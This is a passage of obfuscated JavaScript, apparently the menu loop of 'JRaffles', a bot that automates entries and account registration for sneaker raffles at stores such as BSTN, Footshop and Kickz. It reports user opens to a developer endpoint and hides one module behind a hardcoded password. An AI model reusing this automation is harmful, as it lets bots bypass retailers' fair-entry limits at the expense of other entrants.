    if (_0x459e4e == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x116d4a(0x2710);
        ;
    }
    await _0x22cdfb(_0x459e4e);
    if (_0x471b05 === ![])
        return console['log']('Closing\x20Browser'), await _0x116d4a(0xbb8);
    else
        try {
            var _0x443e34 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x358285
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3b2d4c
                    }
                ]
            }];
            const _0x48e850 = { 'embeds': _0x443e34 };
            var _0xe19441 = await _0x2520f4(null, null, 'open', ![]);
            const _0x30de1c = { 'openDEVMSG': { 'embeds': [_0xe19441] } };
            await _0x3c7bbe(_0x58a2d0, _0x30de1c['openDEVMSG']);
            async function _0x1748f7() {
                _0x244762('JRaffles\x20' + _0x3b2d4c), console['clear'](), console['log']('Hello\x20' + _0x1403a4['cyan']('' + _0x358285) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x3b2d4c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3f7d2c = 0x0; _0x3f7d2c < _0x1a1b7d['length'] - 0x4; _0x3f7d2c++) {
                    if (_0x3f7d2c >= 0xa) {
                        console['log']('\x20(' + _0x3f7d2c + ')\x20[' + _0x1a1b7d[_0x3f7d2c]['name'] + ']');
                        continue;
                    }
                    if (_0x1a1b7d[_0x3f7d2c]['name'] === 'Reload\x20Settings' || _0x1a1b7d[_0x3f7d2c]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3f7d2c + ')\x20\x20[' + _0x1a1b7d[_0x3f7d2c]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x48764d();
                if (taskModule > _0x1a1b7d['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x116d4a(0x3e8), _0x1748f7();
                if (_0x1a1b7d[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x237df0 = await _0x1083d0();
                            await _0x460411['function'](_0x460411, _0x237df0);
                        }
                        if (taskFunction == 0x2) {
                            var _0x237df0 = await _0x1083d0(), _0x19e3f7 = await _0xb9dc1e(_0x460411);
                            _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x19e3f7), await _0x460411['function'](_0x460411, _0x19e3f7, _0x237df0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x237df0 = await _0x1083d0(), _0x19e3f7 = await _0xb9dc1e(_0x460411);
                                _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x19e3f7), await _0x460411['function'](_0x460411, _0x19e3f7, _0x237df0);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x237df0 = await _0x1083d0();
                                    await _0x460411['function'](_0x460411, _0x237df0);
                                }
                            }
                        }
                    } catch (_0x391d92) {
                        console['log'](_0x391d92), await _0x116d4a(0x7d0);
                    }
                    return _0x1748f7();
                }
                if (_0x1a1b7d[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
                            _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
                                _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
                            }
                        }
                    } catch (_0x3016d9) {
                        console['log'](_0x3016d9), await _0x116d4a(0xfa0);
                    }
                    return _0x1748f7();
                }
                if (_0x1a1b7d[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
                            _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
                                _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
                            }
                        }
                    } catch (_0x2dc775) {
                        console['log'](_0x2dc775), await _0x116d4a(0xfa0);
                    }
                    return _0x1748f7();
                }
                if (_0x1a1b7d[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x237df0 = await _0x1083d0();
                        return await _0x460411['function'](_0x460411, _0x237df0), _0x1748f7();
                    }
                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
                }
                if (_0x1a1b7d[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
                }
                if (_0x1a1b7d[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
                }
                if (_0x1a1b7d[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
                } else {
                    if (_0x1a1b7d[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x237df0 = await _0x1083d0(), _0x35b184 = await _0xb9dc1e(_0x460411);
                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x35b184), await _0x460411['function'](_0x460411, _0x35b184, _0x237df0), _0x1748f7();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x237df0 = await _0x1083d0();
                                return await _0x460411['function'](_0x460411, null, _0x237df0), _0x1748f7();
                            }
                        }
                        ;
                    } else {
                        if (_0x1a1b7d[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                            var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction], _0x237df0 = await _0x1083d0(), _0x5c1853 = await _0xb9dc1e(_0x460411);
                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5c1853), await _0x460411['function'](_0x460411, _0x5c1853, _0x237df0), await _0x116d4a(0x1388), _0x1748f7();
                        } else {
                            if (_0x1a1b7d[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x4c58c1 = { 'headers': { 'content-type': 'application/json' } }, _0x4bd611 = { 'key': _0x459e4e }, _0x329776 = await _0x5d1b21['post']('https://jraffles.herokuapp.com/beta', _0x4bd611, _0x4c58c1);
                                    if (_0x329776['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x1403a4['cyan'](_0x358285) + '.\x20Beta\x20Access\x20Granted.'), await _0x116d4a(0x3e8);
                                } catch (_0x41c1a1) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x116d4a(0x7d0), _0x1748f7();
                                }
                                taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction], _0x237df0 = await _0x1083d0(), _0x5c1853 = await _0xb9dc1e(_0x460411);
                                return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5c1853), await _0x460411['function'](_0x460411, _0x5c1853, _0x237df0), await _0x116d4a(0x1388), _0x1748f7();
                            } else {
                                if (_0x1a1b7d[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x237df0 = await _0x1083d0(), _0x35b184 = await _0xb9dc1e(_0x460411);
                                        return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x35b184), await _0x460411['function'](_0x460411, _0x35b184, _0x237df0), _0x1748f7();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x237df0 = await _0x1083d0();
                                            return await _0x460411['function'](_0x460411, null, _0x237df0), _0x1748f7();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1a1b7d[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x460411);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1a1b7d[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                            var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x237df0 = await _0x1083d0(), _0x501f26 = await _0xb9dc1e(_0x460411);
                                                return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x501f26), await _0x460411['function'](_0x460411, _0x501f26, _0x237df0), _0x1748f7();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x237df0 = await _0x1083d0(), _0x501f26 = await _0xb9dc1e(_0x460411);
                                                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x501f26), await _0x460411['function'](_0x460411, _0x501f26, _0x237df0), _0x1748f7();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1a1b7d[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                                var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x237df0 = await _0x1083d0(), _0x54f3c4 = await _0xb9dc1e(_0x460411);
                                                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x54f3c4), await _0x460411['function'](_0x460411, _0x54f3c4, _0x237df0), _0x1748f7();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x237df0 = await _0x1083d0(), _0x54f3c4 = await _0xb9dc1e(_0x460411);
                                                        return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x54f3c4), await _0x460411['function'](_0x460411, _0x54f3c4, _0x237df0), _0x1748f7();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1a1b7d[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x237df0 = await _0x1083d0(), _0x21f9d4 = await _0xb9dc1e(_0x460411);
                                                        return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x21f9d4), await _0x460411['function'](_0x460411, _0x21f9d4, _0x237df0), _0x1748f7();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x237df0 = await _0x1083d0(), _0x21f9d4 = await _0xb9dc1e(_0x460411);
                                                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x21f9d4), await _0x460411['function'](_0x460411, _0x21f9d4, _0x237df0), _0x1748f7();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x1a1b7d[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x237df0 = await _0x1083d0(), _0x437936 = await _0xb9dc1e(_0x460411);
                                                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x437936), await _0x460411['function'](_0x460411, _0x437936, _0x237df0), _0x1748f7();
                                                        }
                                                    } else {
                                                        if (_0x1a1b7d[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x116d4a(0x3e8), _0x1748f7();
                                                        else {
                                                            if (_0x1a1b7d[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x3812bb = _0x1a1b7d[taskModule]['name'], _0x237df0 = await _0x1083d0();
                                                                return await _0x420bf9(_0x3812bb, _0x237df0), _0x1748f7();
                                                            } else {
                                                                if (_0x1a1b7d[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
                                                                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
                                                                    return await _0x460411['function'](_0x460411), _0x1748f7();
                                                                } else {
                                                                    if (_0x1a1b7d[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x2d744f = 0x0;
                                                                        for (const _0x41abd2 in _0x51d52a) {
                                                                            console['log']('(' + _0x2d744f + ')\x20' + _0x41abd2 + '\x20:\x20' + _0x51d52a[_0x41abd2]), _0x2d744f++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x2d744f + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x5e9fe8 = await _0x5dd5e8();
                                                                        if (_0x5e9fe8 == _0x2d744f)
                                                                            return _0x1748f7();
                                                                        console['clear'];
                                                                        var _0x71e312 = 0x0;
                                                                        for (var _0x1b6a7e in _0x51d52a) {
                                                                            if (_0x5e9fe8 == _0x71e312) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1b6a7e + '\x20:'), _0x51d52a[_0x1b6a7e] = await _0x373407(), _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a));
                                                                                break;
                                                                            } else
                                                                                _0x71e312++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x116d4a(0xbb8), _0x1748f7();
                                                                    } else {
                                                                        if (_0x1a1b7d[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x2b1268(), _0x1748f7();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x1a1b7d[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x2a4c53 = await _0x3234cc();
                                                                                _0x2a4c53 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x534960(), await afewFunction(_0x30ecdd[_0x2a3341], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x116d4a(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x1748f7();
            } catch (_0x9ef69f) {
                return console['log'](_0x9ef69f), await _0x116d4a(0x2710), _0x1748f7();
            }
        } catch (_0x15176d) {
            return console['log'](_0x15176d), await _0x116d4a(0x3a98);
        }
}
;
_0x244762('JRaffles\x20' + _0x3b2d4c);
try {
    _0x2b1268(), _0x4556c9();
} catch (_0x2814d6) {
    console['log'](_0x2814d6);
}